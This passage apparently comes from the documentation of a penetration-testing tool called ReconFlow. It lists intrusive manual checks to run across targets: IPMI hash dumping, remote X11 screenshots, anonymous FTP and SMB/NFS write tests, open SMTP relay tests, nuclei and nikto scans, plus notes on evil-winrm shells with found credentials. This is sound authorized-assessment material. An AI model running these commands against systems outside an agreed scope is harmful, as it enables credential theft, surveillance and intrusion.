each ike-aggr ike 'ike-scan -A -M --sport=0 --dport=$P $T'

# IPMI hash dump
msf_rc ipmi-hashes ipmi auxiliary/scanner/ipmi/ipmi_dumphashes
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/ipmi-hashes.rc; exit"

# Printer: PJL device ID only (prints nothing); file access is PRET, by hand
each pjl-id jetdirect 'printf "\033%%-12345X@PJL INFO ID\r\n\033%%-12345X\r\n" | nc -w 5 $T $P'

# RMI method guessing (remote-method-guesser)
RF_TIMEOUT=600 each rmg-enum rmi 'rmg enum $T $P'
RF_TIMEOUT=1800 each rmg-guess rmi 'rmg guess $T $P'

# git repository guessing — your list of likely names
export REPOS="app web api backend config infra"
each git-guess git 'for r in $REPOS; do echo "## $r"; git ls-remote git://$T:$P/$r 2>&1 | head -3; done'

# SIP extension enumeration (sipvicious)
each sip-ext sip 'svwar -m INVITE -p $P $T'

# X11 screenshot — saved next to the evidence
each x11-shot x11 'xwd -root -display $T:$((P - 6000)) -out evidence/x11-shot_${T}_${P}.xwd && echo "saved evidence/x11-shot_${T}_${P}.xwd"'

# FTP write test — only hosts with anonymous FTP: upload a test file, then delete it
echo "reconflow write test - safe to delete" > rf-write-test.txt
each ftp-write vulnerabilities/hosts/ftp-anon.txt 'curl -s -m 20 --user anonymous:rf@test -T rf-write-test.txt ftp://$T:$P/ && echo "UPLOADED" && curl -s -m 20 --user anonymous:rf@test ftp://$T:$P/ -Q "DELE rf-write-test.txt" -o /dev/null && echo "DELETED"'

# Heavy web scans — nuclei takes a URL list (both schemes); nikto per port
each_file nuclei web 'L=$(mktemp); sed "s#.*#http://&:$P\nhttps://&:$P#" $F > $L; nuclei -silent -l $L; rm -f $L'
RF_TIMEOUT=1800 each nikto web 'nikto -h $T -p $P -maxtime 1500s -nointeractive'
```

> ✍️ **You must report all of these yourself**, except **DNS amplification**
> (✅ by itself — `… x Amplification`). Their output is in `evidence/`
> (`x11-shot` saves an image there; `rmg`, `nuclei`, `nikto` print what they
> found). The IPMI hashes show up under *Other Metasploit output* — add a
> *New findings* block for them.

**SMB and NFS write tests** stay one at a time: the writable share or export
is named in the finding (`smb-share-anon` / `nfs-writable` detail), so put a
test file there by hand — `smbclient -N //TARGET/<share> -p PORT -c 'put
rf-write-test.txt'` then `del rf-write-test.txt`; for NFS mount read-write,
`touch`, check `ls -ln` for `no_root_squash` (owner stays root), `rm`.

**SMTP relay via Metasploit** — only if sending a real message is in scope:

```bash
msf_rc smtp-relay smtp auxiliary/scanner/smtp/smtp_relay 'set MAILFROM a@external1.example' 'set MAILTO b@external2.example'
msfconsole -q -x "resource msf-manual.rc; resource msf-blocks/smtp-relay.rc; exit"
```

> ✅ **By itself** (`Potential open SMTP relay detected`). The SMB / NFS
> write tests above: ⛔ **not saved** — copy the commands and output into
> `evidence/`, then add a *New findings* block.

---

## What still needs one target at a time

Everything above runs on all targets. These can't be looped — they need a
person per host — and **⛔ none of them is saved for you**. Save proof as
you go, named `evidence/<name>_<ip>_<port>_1.txt`:

```bash
# an interactive session (nc, telnet, ftp): records everything on screen
script -q evidence/relay-confirm_10.0.0.5_25_1.txt -c "nc -nv 10.0.0.5 25"
# a command's output
some-command 2>&1 | tee evidence/<name>_10.0.0.5_8080_1.txt
# a browser / GUI: save the screenshot into evidence/
```

Then add a *New findings* block in `manual-checklist.md` with `Evidence:`
pointing to the file (or tick *confirmed* on the finding's checklist entry).

| Step | Why |
|---|---|
| Browsing web apps (admin panels, listings, errors) | judgement — what a page *means* |
| Watching a camera stream / looking at an RDP login screen | a human looks at it (the loops above collect the evidence) |
| Vendor default credentials on devices and web login panels | different per product and model |
| Confirming an open relay by hand (`nc` + SMTP commands) | an interactive session — one host is enough proof |
| `evil-winrm` shell with found credentials | an interactive shell |
| PRET file access on printers | an interactive shell; can print paper |
| SMB / NFS write tests | the writable share / export differs per host |
| Ruby DRb code-execution test | no module; by hand only |

---

## Summary

| # | What | Run by ReconFlow? | Run it on every target with | Where it's listed for your run |
|---|---|---|---|---|
| 1 | Safe checks | **Yes — at the end of every run** (browsing web apps stays by hand) | already done | `FINDINGS.md` → *Safe checks — possible issues* · `SAFE-CHECKS.md` |
| 2 | Services with no coverage | no checks exist | `each banner unknown …` | `needs-attention/` |
| 3 | Risky checks | **Never** | `each R_<check> …` (lands on the checklist) | `manual-checklist.md` section 1 · `FINDINGS.md` → *Manual follow-up* |
| 4 | Credential testing | **Never** (commented out in `metasploit.rc`) | `msf_rc creds-…` → `resource` | `FINDINGS.md` → *Manual follow-up* |
| 5 | Exploit confirmations | **Never** | `msf_rc … vulnerabilities/hosts/<finding>.txt` | `FINDINGS.md` → *Metasploit reference* per finding |
| 6 | Other intrusive steps | **Never** | `each` / `each_file` / `msf_rc` | this page |

What automation *does* cover: [AUTOMATED_TESTING.md](../reference/AUTOMATED_TESTING.md).
